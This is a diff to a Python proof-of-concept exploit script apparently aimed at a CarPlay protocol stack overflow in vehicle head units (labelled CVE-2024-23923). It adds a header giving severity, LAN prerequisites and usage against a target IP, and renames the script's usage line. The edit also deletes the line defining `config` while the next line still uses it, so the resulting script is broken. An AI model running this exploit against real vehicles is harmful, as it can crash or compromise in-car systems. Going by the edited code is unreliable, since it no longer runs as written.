@@ -1,3 +1,14 @@
+"""
+PoC Name: CarPlay Protocol Stack Overflow
+CVE: CVE-2024-23923
+Component: Application Stack
+Category: Application
+Severity: High
+CVSS: 7.5
+Description: 超大CarPlay协议数据包触发头单元栈溢出
+Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
+Usage: python3 50_CarPlay_Stack_Overflow.py <target_ip>
+"""
 import socket
 import struct
 import sys
@@ -70,10 +81,7 @@ class AlpineCarPlayPlugin(IVIVulnerabilityPlugin):
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: python3 4_AlpineCarPlayPlugin.py <target_ip>")
+        print("Usage: python3 50_CarPlay_Stack_Overflow.py <target_ip>")
         sys.exit(1)
-    
-    config = {"target_ip": sys.argv[1]}
     plugin = AlpineCarPlayPlugin(config)
     plugin.run_verify()
-    
